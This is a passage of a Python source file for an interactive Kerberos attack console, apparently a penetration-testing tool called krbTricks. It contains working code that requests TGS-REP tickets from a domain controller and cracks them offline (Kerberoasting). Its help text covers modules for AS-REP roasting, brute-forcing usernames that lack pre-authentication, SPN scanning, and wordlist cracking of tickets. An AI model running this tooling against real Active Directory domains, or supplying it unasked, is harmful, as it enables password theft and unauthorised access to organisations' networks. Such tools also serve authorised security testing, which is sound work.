    #               else:
    #                   gotasrep = 'No'
    #               print "[%d]\t%s\t%s@%s" % (idx, gotasrep, accts['user_name'], accts['domain'])
    #               gotasrep = 'No'
                show('users')
            except:
                print(' Uh-oh, something went wrong :(')
                return


        else:
            krbTricks.bad_cmd(self, 'net_get_as_rep')
            return


    def do_net_get_tgs_rep(self, line):
	try:
            user_key = (RC4_HMAC, ntlm_hash(krbTricks.set_arg['password']).digest())
            krbTricks.set_arg['target_service']
        except:
            krbTricks.bad_cmd(self, 'net_get_tgs_rep')
            return
        if len(line) >= 3:
            pkt, plaintext_password = line.split(' ', 1)
            user_key = (RC4_HMAC, ntlm_hash(plaintext_password).digest())
            crack_tgs_rep(user_key, pkt, plaintext_password)
        elif 'domain' in krbTricks.set_arg and 'username' in krbTricks.set_arg and 'dc' in krbTricks.set_arg:
            try:
                net_get_user_sid(krbTricks.set_arg['dc'], krbTricks.set_arg['username'], krbTricks.set_arg['domain'] , krbTricks.set_arg['password'], krbTricks.set_arg['username'])
                target_service = target_host = kdc_b = None
                user_realm = krbTricks.set_arg['domain']
                user_name = krbTricks.set_arg['username']
                target_realm = krbTricks.set_arg['domain']
                user_sid = krbTricks.set_arg['user_sid']
                target_service = "krbtgt"
                kdc_a = krbTricks.set_arg['dc']
                krbTricks.set_arg['pre'] = True
                net_get_tgs_rep(user_realm, user_name, user_sid, user_key, kdc_a, target_realm, target_service, target_host, krbtgt_a_key=None, trust_ab_key=None, target_key=None)
                target_service,target_realm = krbTricks.set_arg['target_service'].split('/')
                net_get_tgs_rep(user_realm, user_name, user_sid, user_key, kdc_a, target_realm, target_service, target_host, krbtgt_a_key=None, trust_ab_key=None, target_key=None)
                #net_get_tgs_rep(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_service, target_host)
                krbTricks.set_arg['pre'] = False
            except:
                print(' Uh-oh, something went wrong :(')
                return
        else:
            krbTricks.bad_cmd(self, 'net_get_tgs_rep')
            return

    def help_use(self):
        print '\n'.join([ ' Use an attack module', ' use [module]', '']) 

    def bad_cmd(self, line):
        if line == 'mod_krb':
            print '\n Modfy a KRB ticket\n  Not implemented yet :\'(\n\n'
        elif line == 'brute_sid':
            print '\n Brute User by SID\n  Not implemented yet :\'(\n\n'
        elif line == 'brute_no_pre_auth':
            print '\n Bruteforce usernames of domain users and find users with \'Do not use Kerberos Pre-Authentication\' set.\n\n Options\n -------\n  domain [Domain]\n  dc [Domain Controller]\n  userlist [usernames file]\n\n'
        elif line == 'brute_user':
            print '\n Brute User by Name\n  Not implemented yet :\'(\n\n'
        elif line == 'scan_ldap_no_pre_auth':
            print '\n Scan for No Pre-Auth\n  Not implemented yet :\'(\n\n'
        elif line == 'scan_spn':
            print '\n Scan for Service Accounts.\n\n Options\n -------\n  domain [Domain] onlyfor.hax\n  username [Target user]\n  password [password] (optional)\n  user_sid [SID] (optional)\n  dc [Domain Controller]\n\n'
        elif line == 'dump_domain_users':
            print '\n Dump Users\n  Not implemented yet :\'(\n\n'
        elif line == 'dump_domain_hashes':
            print '\n Dump Hashes\n  Not implemented yet :\'(\n\n'
        elif line == 'pcap_get_tickets':
            print "\n Get Kerberos tickets from a packet capture file.\n\n Options\n -------\n  pcap [pcap file]\n\n"
        elif line == 'crack_as_rep':
            print "\n Crack recovered AS-REP tickets.\n\n Options\n -------\n  wordlist [dictionary file]\n\n"
        elif line == 'crack_tgs_rep':
            print "\n Crack recovered TGS-REP tickets.\n\n Options\n -------\n  wordlist [dictionary file]\n\n"
        elif line == 'crack_as_rep_manual':
            print "\n Crack a recovered AS-REP.\n\n crack_as_rep_manual [ticket number]\n\n Options\n -------\n  wordlist [dictionary file]\n\n"
        elif line == 'crack_tgs_rep_manual':
            print "\n Crack a recovered TGS-REP.\n\n crack_tgs_rep_manual [ticket number]\n\n Options\n -------\n  wordlist [dictionary file]\n\n"
        elif line == 'net_get_as_rep':
            print "\n Get an AS-REP from the DC interactively.\n\n Options\n -------\n  domain [Domain] onlyfor.hax\n  username [Target user]\n  password [password] (optional)\n  user_sid [SID] (optional)\n  dc [Domain Controller]\n\n"
        elif line == 'net_get_tgs_rep':
            print "\n Get an TGS-REP from the DC interactively.\n\n Options\n -------\n  domain [Domain] onlyfor.hax\n  username [Authenticated user]\n  password [password]\n  user_sid [SID] (optional)\n  target_service [SPN to get TGS-REP for]\n  dc [Domain Controller]\n\n"
        elif line == 'crack_tickets':
            print "\n Crack all recovered Kerberos tickets.\n\n Options\n -------\n  wordlist [dictionary file]\n\n"
        else:
            print "\nAw, man. How did we get here? Try \'help\'?\n\n"

        return True

    def do_exit(self, line):
        return True

    def do_quit(self, line):
        return True

    def emptyline(self):
        if self.lastcmd:
            self.lastcmd = ""
            return self.onecmd('\n')



if __name__ == '__main__':
    krbTricks().cmdloop()

